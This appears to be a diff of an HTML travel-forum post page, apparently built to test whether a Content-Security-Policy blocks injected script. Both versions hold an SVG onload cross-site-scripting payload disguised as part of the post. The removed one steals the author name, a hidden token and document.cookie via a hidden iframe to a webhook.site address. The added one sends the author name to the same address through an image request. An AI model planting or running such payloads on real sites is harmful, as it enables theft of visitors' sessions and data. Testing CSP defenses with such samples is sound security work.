@@ -2,54 +2,45 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Forum Post – Travel Tips</title>
+  <title>Secure Forum</title>
+
+  <!-- CSP bloqueando praticamente tudo -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">
 
   <style>
     body {
       font-family: sans-serif;
       padding: 20px;
-      background: #f8f9fa;
+      background: #f0f0f0;
     }
     .post {
       background: white;
       padding: 20px;
-      border-radius: 10px;
+      border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     .author {
       font-weight: bold;
-      margin-bottom: 10px;
-    }
-    #token {
-      display: none;
     }
   </style>
 </head>
 <body>
-  <h1>Travel Forum</h1>
+  <h1>Secure Travel Forum</h1>
   <div class="post">
-    <div class="author" id="user">User123:</div>
+    <div class="author">User123:</div>
     <div class="content">
-      Here's a cool travel tip!<br><br>
+      Here’s a safe tip: Never trust gelato 🍦 from empty shops!<br><br>
 
-      <div id="token">fake-jwt-token-abc123</div>
-
-      <!-- Payload que cria um iframe para exfiltrar dados -->
+      <!-- Este SVG não é executado no site original por causa da CSP -->
       <svg onload="
-        const u = document.getElementById('user')?.innerText;
-        const t = document.getElementById('token')?.innerText;
-        const c = document.cookie;
-        const url = 'https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
-          'user=' + encodeURIComponent(u) + '&token=' + encodeURIComponent(t) + '&cookies=' + encodeURIComponent(c);
-        const iframe = document.createElement('iframe');
-        iframe.src = url;
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-      ">
-      </svg>
+        const u = document.querySelector('.author')?.innerText;
+        const url = 'https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?user=' + encodeURIComponent(u);
+        const i = document.createElement('img');
+        i.src = url;
+        document.body.appendChild(i);
+      "></svg>
 
-      <p>If you're visiting Italy, make sure to try the gelato! 🍦</p>
+      <p>Happy travels!</p>
     </div>
   </div>
 </body>
